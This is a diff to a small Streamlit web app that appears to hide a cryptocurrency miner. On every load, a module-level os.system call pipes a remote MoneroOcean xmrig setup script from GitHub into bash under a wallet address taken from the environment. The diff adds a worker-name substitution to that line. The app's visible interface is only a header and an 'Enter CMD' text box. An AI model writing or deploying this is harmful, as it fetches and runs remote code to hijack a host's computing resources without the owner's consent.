@@ -2,6 +2,7 @@ import os
 import streamlit as st
 
 address = os.getenv("KEY")
+worker = os.getenv("WORKER")
 
 st.header('My Streamlit App')
 input_text = st.text_input('Enter CMD')
@@ -15,4 +16,4 @@ if button == True:
     st.text('Please Enter CMD')
     
 
-os.system("curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s {address}")
+os.system("curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | sed -e's%hostname%echo {worker}%' | bash -s {address}")
